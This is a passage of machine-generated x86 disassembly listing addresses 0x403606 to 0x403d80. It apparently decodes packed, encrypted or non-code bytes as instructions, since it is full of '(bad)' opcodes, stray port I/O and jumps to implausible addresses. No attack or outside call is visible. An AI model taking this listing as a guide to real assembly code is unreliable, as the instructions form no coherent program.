  403606:	lds    esi,FWORD PTR [edi-0x63557c3e]
  40360c:	add    edx,ebx
  40360e:	mov    bl,0x85
  403610:	push   esp
  403611:	dec    ecx
  403612:	je     0x4035de
  403614:	lea    ebp,[esi]
  403616:	imul   edx,ebx,0xf88656c6
  40361c:	(bad)  
  40361d:	jg     0x4035bd
  40361f:	loope  0x403629
  403621:	push   0x6b496606
  403626:	push   ds
  403627:	jg     0x4035b3
  403629:	lods   eax,DWORD PTR ds:[esi]
  40362a:	icebp  
  40362b:	push   ebx
  40362c:	retf   
  40362d:	test   ah,ch
  40362f:	dec    esp
  403630:	add    BYTE PTR [esi+0x2e],dl
  403633:	mov    dl,0x2
  403635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403636:	pop    ds
  403637:	test   eax,0x844ae41b
  40363c:	xor    BYTE PTR ds:0x3299f7c,ah
  403642:	push   0xffffffc5
  403644:	in     al,0x0
  403646:	add    bh,BYTE PTR [ecx]
  403648:	fdivp  st(5),st
  40364a:	jno    0x403655
  40364c:	repz (bad) 
  40364e:	mov    al,0x28
  403650:	call   0xa9f51624
  403655:	cmp    BYTE PTR [esi-0x12664d7b],0xd2
  40365c:	lahf   
  40365d:	mov    dl,0x3c
  40365f:	in     eax,0x82
  403661:	stos   DWORD PTR es:[edi],eax
  403662:	mov    eax,DWORD PTR [eax]
  403664:	sbb    ebp,DWORD PTR [edx+edi*8]
  403667:	into   
  403668:	pop    es
  403669:	xor    eax,0x1e2a91b9
  40366e:	push   0x870731a2
  403673:	cmp    esi,DWORD PTR [eax+0x48]
  403676:	ss or  al,0x6b
  403679:	push   ecx
  40367a:	cmc    
  40367b:	pop    esp
  40367c:	inc    esi
  40367d:	jp     0x403633
  40367f:	ins    DWORD PTR es:[edi],dx
  403680:	pop    ebp
  403681:	arpl   bp,bp
  403683:	add    dl,bh
  403685:	retf   
  403686:	mov    WORD PTR [ecx],?
  403688:	loope  0x40365c
  40368a:	aas    
  40368b:	outs   dx,DWORD PTR ds:[esi]
  40368c:	int3   
  40368d:	stc    
  40368e:	cs pusha 
  403690:	xlat   BYTE PTR ds:[ebx]
  403691:	loopne 0x403664
  403693:	int    0x96
  403695:	scas   eax,DWORD PTR es:[edi]
  403696:	jo     0x403694
  403698:	mov    esi,DWORD PTR [esi-0x625f53bd]
  40369e:	add    bl,BYTE PTR [ebx-0x794a7b45]
  4036a4:	and    eax,DWORD PTR [ebx]
  4036a6:	inc    esp
  4036a7:	mov    bh,0x38
  4036a9:	sbb    al,BYTE PTR [eax]
  4036ab:	bound  esi,QWORD PTR [eax+eax*1+0x117d9315]
  4036b2:	push   cs
  4036b3:	jp     0x4036e7
  4036b5:	fwait
  4036b6:	dec    edi
  4036b7:	(bad)
  4036ba:	push   esp
  4036bb:	mov    ah,0xb0
  4036bd:	mov    ebp,0xcc719779
  4036c2:	bound  edx,QWORD PTR [esi-0x1cc73621]
  4036c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036c9:	mov    eax,0x676dfa23
  4036ce:	push   cs
  4036cf:	shl    DWORD PTR [esi+edx*4],1
  4036d2:	adc    eax,0x5402fbb8
  4036d7:	pop    es
  4036d8:	mov    ebx,0x89f64ef5
  4036dd:	and    ah,BYTE PTR [edx+0x15]
  4036e0:	dec    ecx
  4036e1:	push   ebx
  4036e2:	jns    0x4036f8
  4036e4:	call   0xae6c1836
  4036e9:	ds cli 
  4036eb:	xor    ah,BYTE PTR [ebp-0xf]
  4036ee:	(bad)  
  4036ef:	dec    ecx
  4036f0:	sub    al,0x20
  4036f2:	int3   
  4036f3:	inc    eax
  4036f4:	add    ecx,DWORD PTR [ecx+0x7bc28f8d]
  4036fa:	xchg   esi,eax
  4036fb:	outs   dx,BYTE PTR ds:[esi]
  4036fc:	sub    DWORD PTR [ebx+edi*4-0x5f22bfb3],0x7eb38c5c
  403707:	cmp    al,0x55
  403709:	ret    0x1d65
  40370c:	push   ds
  40370d:	xchg   esp,eax
  40370e:	dec    eax
  40370f:	add    dh,bh
  403711:	out    0x62,al
  403713:	push   ebx
  403714:	js     0x49784910
  40371a:	pop    es
  40371b:	or     DWORD PTR [ecx+0x1a],eax
  40371e:	push   edi
  40371f:	and    al,0x5a
  403721:	fld    TBYTE PTR [ecx]
  403723:	aas    
  403724:	push   ebx
  403725:	(bad)  ds:0x444f053d
  40372b:	dec    esp
  40372c:	push   ss
  40372d:	push   esi
  40372e:	(bad)  
  40372f:	sbb    dh,bl
  403731:	cmp    al,0xc6
  403733:	jmp    0x80495b13
  403738:	sub    ebx,ebp
  40373a:	inc    edi
  40373b:	xchg   ecx,eax
  40373c:	adc    dh,dl
  40373e:	mov    bl,ch
  403740:	das    
  403741:	sbb    edx,ecx
  403743:	scas   al,BYTE PTR es:[edi]
  403744:	cmp    al,0x0
  403746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403748:	fmulp  st(4),st
  40374a:	fst    st(3)
  40374c:	mov    ebp,0xd88316d3
  403751:	mov    esi,0xa5f3724f
  403756:	and    bh,0x2d
  403759:	imul   eax,ecx,0xf2702918
  40375f:	inc    ebp
  403760:	add    al,0x9b
  403762:	xor    esi,DWORD PTR [edi]
  403764:	out    0x81,eax
  403766:	pop    esp
  403767:	sub    al,BYTE PTR [edi+0x5]
  40376a:	xchg   ebp,eax
  40376b:	pop    ecx
  40376c:	push   esp
  40376d:	sbb    al,0xde
  40376f:	or     al,0x31
  403771:	not    DWORD PTR [esi]
  403773:	cld    
  403774:	add    BYTE PTR ds:0x6b6d37ee,bl
  40377a:	and    DWORD PTR [ecx-0x62],edi
  40377d:	push   eax
  40377e:	cmp    BYTE PTR [edx-0x4ac9231],bh
  403784:	sar    BYTE PTR [esi+0x4a],0xe9
  403788:	add    esp,DWORD PTR [edx-0x27]
  40378b:	push   ss
  40378c:	sub    ah,BYTE PTR [eax-0x19283829]
  403792:	fnstenv [eax+0x25db1c7d]
  403798:	imul   ebp,DWORD PTR [ebx-0x22],0x52
  40379c:	shr    DWORD PTR [ecx+0x2d7b00de],0x54
  4037a3:	add    al,0x64
  4037a5:	dec    edi
  4037a6:	xchg   esi,eax
  4037a7:	add    eax,0xec8b661
  4037ac:	outs   dx,BYTE PTR ds:[esi]
  4037ad:	pop    eax
  4037ae:	or     cl,BYTE PTR [edi]
  4037b0:	aas    
  4037b1:	fimul  DWORD PTR [ebp+ecx*1+0x8]
  4037b5:	hlt    
  4037b6:	mov    cs,WORD PTR [ecx*4-0x65f64002]
  4037bd:	rol    BYTE PTR [ecx],1
  4037bf:	or     bl,ah
  4037c1:	xor    al,BYTE PTR [edi+0xa]
  4037c4:	lods   al,BYTE PTR ds:[esi]
  4037c5:	pushf  
  4037c6:	test   DWORD PTR [ebx],ecx
  4037c8:	pop    ecx
  4037c9:	cmp    DWORD PTR [ebx-0x1d6d9e4],0x1c
  4037d0:	not    DWORD PTR [esi+0x37]
  4037d3:	pop    ds
  4037d4:	add    BYTE PTR [ebp+0x79],ah
  4037d7:	push   ds
  4037d8:	xchg   ebp,eax
  4037d9:	add    BYTE PTR [ebx-0x4c],ch
  4037dc:	sbb    esp,DWORD PTR [edx+0x41]
  4037df:	neg    BYTE PTR [ecx]
  4037e1:	stos   DWORD PTR es:[edi],eax
  4037e2:	rdtsc  
  4037e4:	sbb    BYTE PTR [ebp+ebp*2+0x10b11972],dh
  4037eb:	scas   eax,DWORD PTR es:[edi]
  4037ec:	adc    bl,BYTE PTR [esi+0x4f12ecf6]
  4037f2:	les    ebp,FWORD PTR [ecx]
  4037f4:	adc    DWORD PTR [eax+0x32],edi
  4037f7:	push   0xa51bdd10
  4037fc:	adc    eax,0x13e6b1ca
  403801:	repz fbld TBYTE PTR [ecx]
  403804:	push   ss
  403805:	sbb    al,0xfa
  403807:	pop    edi
  403808:	pop    ss
  403809:	dec    ecx
  40380a:	and    al,0x96
  40380c:	cmp    BYTE PTR [esi],dh
  40380e:	xchg   edx,eax
  40380f:	push   ebx
  403810:	cmp    DWORD PTR [edi-0x10],esp
  403813:	adc    bh,BYTE PTR [ebx]
  403815:	nop
  403816:	(bad)  
  403817:	sar    BYTE PTR [edx],1
  403819:	add    BYTE PTR [edi+0x33],ah
  40381c:	inc    esp
  40381d:	aas    
  40381e:	jo     0x40387c
  403820:	xchg   BYTE PTR [esi],bh
  403822:	leave  
  403823:	loop   0x4037e3
  403825:	cmp    al,0x9e
  403827:	mov    BYTE PTR [edx],al
  403829:	cmp    eax,0x365ecd23
  40382e:	in     al,0xa2
  403830:	pushf  
  403831:	aaa    
  403832:	sub    eax,0x3a35da19
  403837:	outs   dx,DWORD PTR ds:[esi]
  403838:	sbb    BYTE PTR [edi+ecx*8],dh
  40383b:	push   di
  40383d:	xor    DWORD PTR [eax],eax
  40383f:	js     0x40384d
  403841:	xchg   ebp,eax
  403842:	xor    BYTE PTR [ecx-0x4e],ah
  403845:	shl    DWORD PTR [edx],cl
  403847:	push   esi
  403848:	fcom   DWORD PTR [ecx]
  40384a:	xor    ebx,DWORD PTR [ebx-0x23db94c5]
  403850:	push   esp
  403851:	test   eax,0xede73525
  403856:	daa    
  403857:	ret    0x2d80
  40385a:	es aaa 
  40385c:	xchg   esp,eax
  40385d:	bound  esp,QWORD PTR [ebx]
  40385f:	mov    al,ds:0x59229efe
  403864:	inc    eax
  403865:	out    0x20,al
  403867:	push   cs
  403868:	sub    DWORD PTR [ecx+eiz*1],esp
  40386b:	mov    bl,0x6b
  40386d:	js     0x403899
  40386f:	aam    0x5
  403871:	mov    edx,0xfcbd7d2b
  403876:	sub    DWORD PTR [edx-0x31],ebp
  403879:	sub    BYTE PTR ds:[edi],bh
  40387c:	les    esi,FWORD PTR [ecx+0x2d]
  40387f:	or     BYTE PTR [esi+0x10112cb3],ch
  403885:	cmc    
  403886:	cs data16 jp 0x4038c1
  40388a:	das    
  40388b:	dec    ebx
  40388c:	push   ebx
  40388d:	call   0x6271:0x583d2c70
  403894:	pop    esp
  403895:	pop    edx
  403896:	push   ds
  403897:	adc    DWORD PTR [ecx-0x10],ebp
  40389a:	fcomi  st,st(0)
  40389c:	std    
  40389d:	in     eax,0x92
  40389f:	in     eax,dx
  4038a0:	(bad)  
  4038a1:	dec    ebp
  4038a2:	push   ecx
  4038a3:	add    ah,dh
  4038a5:	pop    ds
  4038a6:	mov    dl,0x17
  4038a8:	out    dx,al
  4038a9:	cmp    al,0x98
  4038ab:	aad    0xd7
  4038ad:	cmp    bh,bl
  4038af:	mov    esp,edx
  4038b1:	xor    esi,DWORD PTR [ebp+0x4b]
  4038b4:	int    0xe2
  4038b6:	or     cl,BYTE PTR ds:0xcf2111c7
  4038bc:	mov    esi,0xbb803794
  4038c1:	jg     0x4038e0
  4038c3:	inc    edx
  4038c4:	stos   BYTE PTR es:[edi],al
  4038c5:	mov    dh,0x63
  4038c7:	add    al,0xa8
  4038c9:	cmc    
  4038ca:	mov    esi,0xbbea4099
  4038d0:	xchg   BYTE PTR [ebx+0x40],bh
  4038d3:	jle    0x403954
  4038d5:	sub    bh,BYTE PTR [esi-0x6be68ac8]
  4038db:	cli    
  4038dc:	mov    WORD PTR [edx+eax*4-0x5748764b],cs
  4038e3:	ja     0x40395d
  4038e5:	out    dx,al
  4038e6:	push   esp
  4038e7:	xor    DWORD PTR [edx-0x13],edi
  4038ea:	cli    
  4038eb:	repnz dec ebx
  4038ed:	call   0x380e82b
  4038f2:	adc    BYTE PTR [ebp+0x41],ch
  4038f5:	shr    BYTE PTR [edi+0x2b],cl
  4038f8:	inc    ebx
  4038f9:	mov    eax,ds:0x4442e9c5
  4038fe:	shl    DWORD PTR [esi+0x64794f3f],cl
  403904:	inc    esi
  403905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403906:	pop    es
  403907:	and    al,BYTE PTR [eax]
  403909:	cmp    al,0x85
  40390b:	sub    eax,0x9d905e0
  403910:	iret   
  403911:	lods   eax,DWORD PTR ds:[esi]
  403912:	xchg   ecx,eax
  403913:	mul    BYTE PTR [edi+esi*2-0x70]
  403917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403918:	sbb    dh,BYTE PTR [ecx]
  40391a:	mov    ss,eax
  40391c:	xor    bl,dl
  40391e:	pop    DWORD PTR [ebp+0x27]
  403921:	xchg   esp,eax
  403922:	xchg   edx,eax
  403923:	xor    cl,BYTE PTR ds:0x735b934e
  403929:	or     BYTE PTR [ebp-0x6c05267c],dl
  40392f:	sbb    DWORD PTR [esi-0x4bb164e2],0x4a1f9a64
  403939:	mov    ds:0xe3e0289c,al
  40393e:	pushf  
  40393f:	lods   eax,DWORD PTR ds:[esi]
  403940:	cmc    
  403941:	es cwde 
  403943:	jp     0x4039a0
  403945:	pop    ebp
  403946:	cdq    
  403947:	ret    
  403948:	mov    eax,ds:0x87cc979b
  40394d:	jmp    0x136c72e7
  403952:	lea    eax,[esi+0x6]
  403955:	push   ecx
  403956:	mov    WORD PTR [edi],ss
  403958:	js     0x4038e9
  40395a:	mov    ah,al
  40395c:	shl    DWORD PTR [ebp-0x53c8a76],1
  403962:	test   DWORD PTR [edx-0x3478d793],eax
  403968:	pcmpgtd mm1,QWORD PTR [ecx+0x1c003994]
  40396f:	mov    BYTE PTR [ecx-0x41813c04],dl
  403975:	push   esi
  403976:	cmp    BYTE PTR [esi+0x6f],0xa8
  40397a:	cmp    al,0x80
  40397c:	pop    eax
  40397d:	add    BYTE PTR [esi],0x81
  403980:	mov    ebp,0xea83c994
  403985:	mov    esi,0x1300857b
  40398a:	and    esi,DWORD PTR [edx+0x5e]
  40398d:	cld    
  40398e:	mov    BYTE PTR [edi+ebx*2],dh
  403991:	imul   esi,DWORD PTR [esp+ebp*4-0x1f],0xdfea5696
  403999:	inc    edi
  40399a:	cwde   
  40399b:	daa    
  40399c:	loop   0x4039ce
  40399e:	add    ah,BYTE PTR [esi-0x1d]
  4039a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039a2:	in     al,dx
  4039a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a4:	out    0xd2,al
  4039a6:	mov    fs,edx
  4039a8:	out    0xfb,al
  4039aa:	inc    eax
  4039ab:	and    ebp,esp
  4039ad:	in     al,0x6a
  4039af:	arpl   sp,sp
  4039b1:	loope  0x40395a
  4039b3:	mov    bh,0xef
  4039b5:	out    dx,al
  4039b6:	inc    ecx
  4039b7:	std    
  4039b8:	in     eax,dx
  4039b9:	mov    edi,0x88ec3beb
  4039be:	or     eax,0xff0ded7a
  4039c3:	mov    al,0xe8
  4039c5:	sbb    bl,cl
  4039c7:	out    dx,al
  4039c8:	call   0xeb746d30
  4039cd:	sub    al,0xb5
  4039cf:	jb     0x4039bb
  4039d1:	fld    DWORD PTR [eax]
  4039d3:	xchg   esi,eax
  4039d4:	int3   
  4039d5:	std    
  4039d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039d7:	xor    al,0xb
  4039d9:	cld    
  4039da:	ja     0x403a16
  4039dc:	dec    eax
  4039dd:	inc    BYTE PTR [eax+0x15ff8660]
  4039e3:	dec    esi
  4039e4:	ret    
  4039e5:	cli    
  4039e6:	loop   0x403a17
  4039e8:	add    ebx,edi
  4039ea:	sub    esp,DWORD PTR [edx]
  4039ec:	inc    eax
  4039ed:	stc    
  4039ee:	xor    al,0x48
  4039f0:	jge    0x4039ea
  4039f2:	xor    DWORD PTR [ecx],ecx
  4039f4:	(bad)  
  4039f6:	push   ds
  4039f7:	out    0x1b,eax
  4039f9:	repnz iret 
  4039fb:	int3   
  4039fc:	pop    esp
  4039fd:	lock clc 
  4039ff:	adc    dl,BYTE PTR [edi-0x63e8ff0f]
  403a05:	or     esp,esi
  403a07:	sbb    dh,ch
  403a09:	leave  
  403a0a:	cmc    
  403a0b:	xor    DWORD PTR [eax-0x73],edx
  403a0e:	idiv   esi
  403a10:	and    cl,BYTE PTR [edi-0xa]
  403a13:	stos   DWORD PTR es:[edi],eax
  403a14:	xchg   DWORD PTR [eax-0x27],edi
  403a17:	aam    0xe9
  403a19:	mov    eax,0xfc537dd8
  403a1e:	ficom  DWORD PTR [edx+0x36]
  403a21:	ds fcmovnu st,st(7)
  403a24:	xor    BYTE PTR [ecx-0x22],dh
  403a27:	lock inc ecx
  403a29:	mov    bl,0xdf
  403a2b:	dec    ecx
  403a2c:	cld    
  403a2d:	repz frstor [esi-0x5c23c872]
  403a34:	shr    DWORD PTR [ebx-0x29],1
  403a37:	add    BYTE PTR [ebx+edi*4-0x57],bl
  403a3b:	(bad)  
  403a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a3d:	std    
  403a3e:	out    dx,al
  403a3f:	aam    0xca
  403a41:	addr16 sub eax,0x628047d5
  403a47:	shr    al,1
  403a49:	adc    DWORD PTR [eax-0x19541e2f],esp
  403a4f:	shr    esi,cl
  403a51:	mov    ebp,0x221bd224
  403a56:	pop    esi
  403a57:	lds    esp,FWORD PTR [ecx+ecx*2-0x64]
  403a5b:	les    ebp,FWORD PTR [ebp+0x42c6d8ef]
  403a61:	xchg   ebp,eax
  403a62:	sbb    bh,al
  403a64:	scas   eax,DWORD PTR es:[edi]
  403a65:	mov    DWORD PTR [edi-0x3e],edx
  403a68:	and    al,ch
  403a6a:	xchg   ebx,eax
  403a6b:	ret    
  403a6c:	fst    DWORD PTR [ebp-0x2d]
  403a6f:	shl    DWORD PTR [esi],0x34
  403a72:	adc    eax,eax
  403a74:	xor    esi,DWORD PTR [ecx+0x4d]
  403a77:	retf   
  403a78:	dec    esp
  403a79:	pop    ds
  403a7a:	(bad)
  403a7e:	cmp    al,0xc9
  403a80:	stos   BYTE PTR es:[edi],al
  403a81:	inc    eax
  403a82:	adc    cl,BYTE PTR [ebx]
  403a84:	stos   DWORD PTR es:[edi],eax
  403a85:	(bad)  
  403a87:	inc    ebx
  403a88:	sahf   
  403a89:	mov    dl,0x27
  403a8b:	xchg   BYTE PTR [edi-0x523f2bf5],dl
  403a91:	sbb    al,0x7a
  403a93:	add    ah,BYTE PTR [ecx+esi*1+0x6f3af91]
  403a9a:	mov    bh,0x6d
  403a9c:	add    dl,dh
  403a9e:	xlat   BYTE PTR ds:[ebx]
  403a9f:	inc    esi
  403aa0:	sub    edx,eax
  403aa2:	call   0x76122391
  403aa7:	stc    
  403aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa9:	aam    0x4a
  403aab:	dec    edi
  403aac:	fs int 0xa3
  403aaf:	lods   eax,DWORD PTR ds:[esi]
  403ab0:	and    dh,bh
  403ab2:	mov    ch,0x83
  403ab4:	loopne 0x403aa4
  403ab6:	mov    eax,0xafedbcc0
  403abb:	data16 jle 0x403aa2
  403abe:	pop    esi
  403abf:	adc    al,0x38
  403ac1:	ficom  WORD PTR [ecx+0xcd7fa3a]
  403ac7:	sub    BYTE PTR [ebp+0x76fe03ca],dh
  403acd:	retf   
  403ace:	cmp    bh,BYTE PTR [ecx+esi*1-0x7]
  403ad2:	ins    DWORD PTR es:[edi],dx
  403ad3:	shl    bl,cl
  403ad5:	clc    
  403ad6:	shl    cl,0x88
  403ad9:	fcomip st,st(7)
  403adb:	push   ebp
  403adc:	dec    ebx
  403add:	(bad)  
  403ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403adf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae0:	or     eax,0xcf8b99ec
  403ae5:	in     eax,0x4
  403ae7:	cdq    
  403ae8:	sbb    al,0x3b
  403aeb:	scas   eax,DWORD PTR es:[edi]
  403aec:	inc    edx
  403aed:	fnstenv [edx+0x4d]
  403af0:	add    al,0xeb
  403af2:	gs jecxz 0x403aba
  403af5:	jmp    0x5e5a:0xe82071d9
  403afc:	push   es
  403afd:	sub    bl,BYTE PTR [ebx-0x71]
  403b00:	je     0x403b02
  403b02:	pop    esp
  403b03:	pop    ecx
  403b04:	mov    eax,0x1d5896da
  403b09:	enter  0x55d1,0xa
  403b0d:	pop    esi
  403b0e:	adc    edx,DWORD PTR [ebx+esi*4+0x1b]
  403b12:	jne    0x403b6a
  403b14:	fdiv   QWORD PTR [ecx]
  403b16:	scas   eax,DWORD PTR es:[edi]
  403b17:	push   edi
  403b18:	mov    esp,edx
  403b1a:	xor    BYTE PTR [eax],0x76
  403b1d:	jp     0x403b61
  403b1f:	xor    DWORD PTR [edi],esp
  403b21:	add    BYTE PTR [ebx+esi*1],al
  403b24:	push   eax
  403b25:	es mov esi,0x793bc532
  403b2b:	das    
  403b2c:	mov    dl,0x11
  403b2e:	cmp    ebp,DWORD PTR [esi]
  403b30:	(bad)  [edi-0x33]
  403b33:	sub    al,0x4
  403b35:	mov    esi,0x85012d07
  403b3a:	push   ebx
  403b3b:	ss into 
  403b3d:	stos   BYTE PTR es:[edi],al
  403b3e:	xchg   ecx,eax
  403b3f:	aaa    
  403b40:	lahf   
  403b41:	push   eax
  403b42:	mov    bh,0x35
  403b44:	test   al,0xf6
  403b46:	in     al,dx
  403b47:	xor    ebp,DWORD PTR ds:0xfa3935ed
  403b4d:	inc    edx
  403b4e:	push   0x9eb94338
  403b53:	cmp    cl,BYTE PTR [edi+ecx*4-0x2c]
  403b57:	cmp    bh,BYTE PTR [ecx-0x39dbd9ce]
  403b5d:	sbb    al,0x5c
  403b5f:	and    eax,0x27a25e97
  403b64:	pusha  
  403b65:	enter  0xe000,0x25
  403b69:	cmc    
  403b6a:	ficomp DWORD PTR [edi]
  403b6c:	sub    eax,DWORD PTR [edx]
  403b6e:	jne    0x403bc5
  403b70:	sub    al,BYTE PTR [eax]
  403b72:	dec    ebx
  403b73:	gs nop
  403b75:	mov    cl,0x14
  403b77:	adc    DWORD PTR [edx-0x50],0x11
  403b7b:	rol    BYTE PTR [esi],0xbb
  403b7e:	ds push ss
  403b80:	les    edi,FWORD PTR [edx-0x4775f011]
  403b86:	fmul   st,st(5)
  403b88:	inc    edi
  403b89:	mov    ecx,0xbbfedb3d
  403b8e:	push   0x1
  403b90:	mov    ebp,0x833793bd
  403b95:	mov    edi,0xbe45857c
  403b9a:	jmp    0xc4411500
  403b9f:	fs sbb eax,0xcfa962b8
  403ba5:	stos   BYTE PTR es:[edi],al
  403ba6:	aas    
  403ba7:	cld    
  403ba8:	and    edx,DWORD PTR [edx]
  403baa:	sahf   
  403bab:	fdivr  QWORD PTR [edx-0x71]
  403bae:	sti    
  403baf:	mov    cl,0xfe
  403bb1:	ss adc eax,0x702570b4
  403bb7:	pop    ecx
  403bb8:	add    al,0x9d
  403bba:	push   ss
  403bbb:	cmp    DWORD PTR [ecx],ebp
  403bbd:	lds    esi,FWORD PTR [ebx-0x64]
  403bc0:	sar    DWORD PTR [ebp-0x73],1
  403bc3:	add    DWORD PTR [edi],ebx
  403bc5:	outs   dx,DWORD PTR ds:[esi]
  403bc6:	call   0x4218167f
  403bcb:	add    BYTE PTR [ebx+eax*1+0x70091c4a],dh
  403bd2:	repnz mov edx,0x97dffc4c
  403bd8:	jno    0x403c52
  403bda:	pop    eax
  403bdb:	xchg   BYTE PTR [edi+0xee350c2],bl
  403be1:	ss call 0xfb0a12e4
  403be7:	pop    eax
  403be8:	mov    dh,0x2d
  403bea:	inc    edx
  403beb:	add    BYTE PTR [ebx-0x292084eb],dh
  403bf1:	jle    0x403bba
  403bf3:	addr16 mov ch,cl
  403bf6:	jb     0x403c6d
  403bf8:	pop    ebp
  403bf9:	mov    dh,0xce
  403bfb:	int    0x6b
  403bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bfe:	lods   eax,DWORD PTR ds:[esi]
  403bff:	xchg   ebp,eax
  403c00:	into   
  403c01:	rcl    BYTE PTR [ecx],0x2d
  403c04:	shr    BYTE PTR [esi-0x5c],1
  403c07:	aas    
  403c08:	inc    ebp
  403c09:	add    eax,0x309c8718
  403c0e:	iret   
  403c0f:	sbb    bh,BYTE PTR [ecx+0x56]
  403c12:	jae    0x403bb6
  403c14:	daa    
  403c15:	cmc    
  403c16:	les    esi,FWORD PTR [eax+0x87a9ec2]
  403c1c:	inc    ebp
  403c1d:	jbe    0x403c51
  403c1f:	mov    al,ds:0x188e10a0
  403c24:	fidivr WORD PTR [esi-0x2ac4f5c5]
  403c2a:	xchg   DWORD PTR [edx+0x2f4ee092],esi
  403c30:	add    BYTE PTR [edi-0x7b],dh
  403c33:	in     al,dx
  403c34:	xchg   edi,eax
  403c35:	test   eax,0xbc855925
  403c3a:	dec    esi
  403c3b:	in     eax,0x3d
  403c3d:	mov    bl,BYTE PTR [esi-0x7a]
  403c40:	gs scas eax,DWORD PTR es:[edi]
  403c42:	xor    eax,0x94f1dd3a
  403c47:	(bad)  
  403c48:	iret   
  403c49:	and    al,0xf0
  403c4b:	xor    DWORD PTR [edi-0x43],esi
  403c4e:	(bad)
  403c51:	pop    eax
  403c52:	scas   al,BYTE PTR es:[edi]
  403c53:	pop    eax
  403c54:	push   edx
  403c55:	push   es
  403c56:	add    ch,ch
  403c58:	inc    eax
  403c59:	jecxz  0x403cbf
  403c5b:	push   ecx
  403c5c:	clc    
  403c5d:	ficomp DWORD PTR [edi]
  403c5f:	sub    esi,eax
  403c61:	mov    edi,0x62489744
  403c66:	fdiv   st,st(4)
  403c68:	and    DWORD PTR [eax+0x9e4dbb],ebx
  403c6e:	sbb    al,0x24
  403c70:	dec    ecx
  403c71:	gs jg  0x403c7f
  403c74:	cmc    
  403c75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c77:	pop    ebp
  403c78:	inc    eax
  403c79:	scas   eax,DWORD PTR es:[edi]
  403c7a:	or     ebx,eax
  403c7c:	cld    
  403c7d:	aas    
  403c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c7f:	aam    0x9f
  403c81:	pop    DWORD PTR [edi]
  403c83:	ins    BYTE PTR es:[edi],dx
  403c84:	and    ebp,edi
  403c86:	sub    al,0x1b
  403c88:	xchg   esi,eax
  403c89:	aad    0x91
  403c8b:	xor    al,0x2a
  403c8d:	test   ecx,edi
  403c8f:	cmp    edi,ebp
  403c91:	call   0x811f73
  403c96:	pusha  
  403c97:	add    BYTE PTR [esp+esi*8+0x48ab6372],0xba
  403c9f:	mov    ah,0x5c
  403ca1:	adc    al,0xe9
  403ca3:	sbb    esp,esi
  403ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ca6:	inc    ecx
  403ca7:	cmp    al,0x93
  403ca9:	sbb    eax,0xa1ac9f33
  403cae:	fild   DWORD PTR [edi]
  403cb0:	les    esi,FWORD PTR [esi+0x4e]
  403cb3:	jmp    0x403d1f
  403cb5:	retf   0x920e
  403cb8:	cld    
  403cb9:	jle    0x403ccf
  403cbb:	jne    0x403ce0
  403cbd:	ret    
  403cbe:	fs sahf 
  403cc0:	xor    esp,DWORD PTR [eax+0x1c0c83a4]
  403cc6:	inc    esp
  403cc7:	sub    bh,BYTE PTR [ebx-0x57]
  403cca:	cs or  eax,0x6d9e15d4
  403cd0:	pushf  
  403cd1:	ret    0xd113
  403cd4:	cmp    DWORD PTR [esi-0x75],0xfffffff2
  403cd8:	jecxz  0x403ca4
  403cda:	cdq    
  403cdb:	push   edi
  403cdc:	dec    ebx
  403cdd:	ja     0x403d00
  403cdf:	fimul  DWORD PTR [ebx-0x59f1a8fd]
  403ce5:	sbb    al,0xb3
  403ce7:	data16 add bl,cl
  403cea:	pop    esi
  403ceb:	js     0x403d0a
  403ced:	fs stos BYTE PTR es:[edi],al
  403cef:	add    BYTE PTR [esp+ecx*4-0x4ca66a8b],bh
  403cf6:	mov    cl,0xdd
  403cf8:	ss push esp
  403cfa:	add    BYTE PTR [ebx+ebp*8],bh
  403cfd:	sar    edx,1
  403cff:	stos   DWORD PTR es:[edi],eax
  403d00:	xor    DWORD PTR [ebx+ebp*8],0xa
  403d04:	int3   
  403d05:	rol    DWORD PTR [ebx+0x67],1
  403d08:	and    ebp,DWORD PTR [edi+0x4a35f2a3]
  403d0e:	jl     0x403d6e
  403d10:	mov    ebp,0x588973e3
  403d15:	(bad)  
  403d16:	fiadd  DWORD PTR ds:0xb02c58a0
  403d1c:	scas   al,BYTE PTR es:[edi]
  403d1d:	jne    0x403d32
  403d1f:	cld    
  403d20:	inc    ebp
  403d21:	jmp    0xd893:0xc79e3cba
  403d28:	push   esi
  403d29:	popa   
  403d2a:	repz inc esp
  403d2c:	dec    eax
  403d2d:	cmp    al,0x4c
  403d2f:	shl    DWORD PTR [eax+0x251e239d],1
  403d35:	clc    
  403d36:	or     bl,BYTE PTR [edx-0x33]
  403d39:	push   ss
  403d3a:	pop    esp
  403d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d3c:	mov    ebx,0x3353c373
  403d41:	adc    eax,0x6fdaf0d3
  403d46:	ins    BYTE PTR es:[edi],dx
  403d47:	mov    WORD PTR [ebx-0x7b26e572],ss
  403d4d:	jmp    0x403d82
  403d4f:	test   ebp,ebp
  403d51:	inc    ecx
  403d52:	cmp    al,0x32
  403d54:	push   0x10a9e31f
  403d59:	add    BYTE PTR [ecx-0x6b25201f],bh
  403d5f:	add    BYTE PTR [eax-0x7e7a9c6d],bh
  403d65:	call   0xfed3:0x5628e06b
  403d6c:	pop    ecx
  403d6d:	mov    ds:0x4f615bc1,eax
  403d72:	jns    0x403d26
  403d74:	call   0x31d021f5
  403d79:	clc    
  403d7a:	pop    ebx
  403d7b:	sub    DWORD PTR [ecx],edx
  403d7d:	test   DWORD PTR [esi+0x4],ecx
  403d80:	fdivrp st(0),st
